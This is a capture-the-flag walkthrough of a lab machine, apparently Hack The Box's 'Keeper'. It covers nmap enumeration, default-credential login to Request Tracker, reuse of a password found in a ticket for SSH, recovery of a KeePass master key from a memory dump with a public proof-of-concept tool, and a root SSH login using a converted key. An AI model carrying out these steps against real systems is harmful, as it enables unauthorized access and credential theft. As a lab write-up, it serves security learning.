we begin with a standard nmap enumeration:

	nmap -p-  -sC -sV 10.10.11.227

output:

	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
	|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
	80/tcp open  http    nginx 1.18.0 (Ubuntu)
	|_http-server-header: nginx/1.18.0 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).

there is the 80 port so a webserver, we can browse it and there is link:

	To raise an IT support ticket, please visit tickets.keeper.htb/rt/

we add the domain and the subdomain to the internal DNS:

	sudo nano /etc/hosts
	10.10.11.227 tickets.keeper.htb keeper.htb

it's time to see the website, there is a login page of request tracker service, my first idea is to search about the default credentials and it seems to work.
Inside the website there is an email:

		Issue with Keepas Client on Windows

in a few words inside lnorgaard's home directory there is a dump memory of keepass, so we must search inside the website for some credentials; the first thought it's to search see around the site instead inside the lnorgaard's account i found a password:

	New user. Initial password set to <REDACTED>

The password works inside the website in order to access lnorgaard's account but there isn't anything to see but I remembered that the port 22 is open so I tried the same credential and it works, we can retrieve the user flag.
Inside the home directory there is a zipped folder:

	unzip RT30000.zip

output:

	inflating: KeePassDumpFull.dmp   /memory dump/ 
 	extracting: passcodes.kdbx  /database password/

the first time, i tried keepass2john but the cracking takes to much time so I search on internet and I found an interesting python tool at the following [link](https://github.com/CMEPW/keepass-dump-masterkey), we can use the following command:

	git clone https://github.com/CMEPW/keepass-dump-masterkey
	cd keepass-dump-masterkey
	sudo python3 poc.py -d <name>.dmp

the script above tries to retrieve the master key from the dump but it will not show all password text because the first character can't be obtained but with the remaining the text we can search on internet and found the most likely password, and I found it.
Now it's time to use the master key on the database in order to decrypt, we can do it with these commands:

	sudo apt install keepass2
	keepass2

It's a GUI application, we import inside the database and we type the password, sbam we decrypt it then inside there is a putty private key but we must convert it in openssh private key with the commands below:

	nano id_dsa.ppk /we copy the key inside/
	puttygen id_dsa.ppk -O private-openssh -o id_dsa
	ssh -i id_dsa root@10.10.11.227

We're inside and we can obtain the root flag-
